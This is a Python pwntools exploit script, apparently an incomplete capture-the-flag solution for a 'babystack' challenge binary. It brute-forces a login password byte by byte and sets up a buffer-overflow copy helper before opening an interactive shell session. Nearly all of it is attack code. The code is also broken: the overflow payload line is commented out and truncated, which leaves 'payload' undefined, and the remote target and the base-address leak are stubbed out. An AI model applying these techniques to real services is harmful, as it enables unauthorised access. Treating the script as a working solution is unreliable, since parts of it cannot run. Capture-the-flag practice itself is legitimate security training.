#!/usr/bin/env python3
from pwn import *

elf = ELF("./babystack_patched")
ld = ELF("./ld-2.23.so")
libc = ELF("./given/libc_64.so.6")

if args.REMOTE:
    p = remote()
else:
    p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    if args.D:
       gdb.attach(p)

def enter_password(password):
    # We are allowed to enter 16 bytes for the command,
    # but there are some leaks in cmd_buf[8:16]
    # Therefore, we uses a 8-byte cmd
    p.sendafter(b">> ", b"1" * 8)
    p.sendlineafter(b"Your passowrd :", password)
    msg = p.recvuntil(b"!")
    return b"Login Success" in msg

def logout():
    p.sendlineafter(b">> ", b"1")

def magic_copy(payload):
    p.sendlineafter(b">> ", b"3")
    p.recvuntil(b"Copy :")
    p.send(payload)

def bufovfl(password):
    #payload = (password + b"\x00").ljust(64, b"a") + password + b"3" *
    r = enter_password(payload)
    assert(not r)
    r = enter_password(password)
    assert(r)
    magic_copy(payload[:0x3f])



def leak_password():
    PASSWORD_LENGTH = 0x1
    passwd = b""
    for i in range(PASSWORD_LENGTH):
        for b in range(1, 256):
            curr_passwd = passwd + p8(b)
            if enter_password(curr_passwd):
                passwd = curr_passwd
                break
        logout()
        log.debug("leak recovered: {}".format(passwd))

    log.info("password: {}".format(passwd))
    return passwd

def exploit():
    passwd = leak_password()

    #elf_base = leak_elf(passwd)
    r = enter_password(b"")
    assert(r)

    p.interactive()

if __name__ == "__main__":
    exploit()
